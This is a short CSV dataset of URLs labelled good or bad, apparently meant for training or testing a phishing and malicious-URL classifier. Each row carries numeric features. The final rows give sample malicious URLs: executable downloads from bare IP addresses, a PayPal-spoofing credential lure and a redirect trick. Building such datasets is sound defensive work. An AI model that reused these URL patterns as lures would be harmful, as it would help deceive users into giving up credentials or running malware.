url,label,protocol,length,count,count-www,count-digits,use_of_ip,shortening_service,https_token,include_domain,web_traffic,registration_length
http://scratchpads.eu/explore/sites-list,good,1,40,2,0,0,0,0,0,0,0,0
https://www.wpbeginner.com/showcase/excellent-wordpress-website-examples/,good,0,73,5,1,0,0,0,0,0,0,20
https://iiekalyani.com/,good,0,23,1,0,0,0,0,0,0,0,10
http://gnit.ac.in/,good,1,18,2,0,0,0,0,0,0,0,62
http://www.aecwb.edu.in/,good,1,24,3,1,0,0,0,0,0,0,88
http://adamasuniversity.ac.in/,good,1,30,2,0,0,0,0,0,0,0,48
http://adamasuniversity.ac.in/virtual-tour/,good,1,43,3,0,0,0,0,0,0,0,48
http://www.saha.ac.in/web/npd-home,good,1,34,4,1,0,0,0,0,0,0,97
http://www.saha.ac.in/web/npd-alumni/faculty,good,1,44,4,1,0,0,0,0,0,0,97
http://www.hbni.ac.in/cis/sinp.html,good,1,35,4,1,0,0,0,0,0,0,106
http://www.saha.ac.in/web/previous-programs,good,1,43,4,1,0,0,0,0,0,0,97
https://www.architecticastartups.com/,good,0,37,2,1,0,0,0,0,0,0,7
https://www.techsimplus.com/TechSim_Internship/online_summer_internship/,good,0,72,2,1,0,0,0,0,0,0,8
https://www.preservearticles.com/short-essays/time-is-a-tyrant/4900,good,0,67,6,1,4,0,0,0,0,0,16
https://www.kopykitab.com/blog/category/question-paper/wbut-solved-question-papers/,good,0,83,6,1,0,0,0,0,0,0,5
http://192.168.43.112/virus.exe,bad,1,31,4,0,11,1,0,0,1,1,0
http://172.149.1.61/payload.exe,bad,1,31,4,0,9,1,0,0,1,1,0
http://signin.paypal.com@10.19.32.4/o,bad,1,37,6,0,7,1,0,0,1,1,0
http://63.17.167.23/pc/verification.htm?=https://www.paypal.com/,bad,1,64,8,1,9,1,0,1,0,1,10
http://example.com/redirect.php?dest=https://172.43.125.4/,bad,1,58,7,0,9,1,0,1,1,0,0
http://https-items.com,bad,1,22,2,0,0,0,0,1,1,1,0
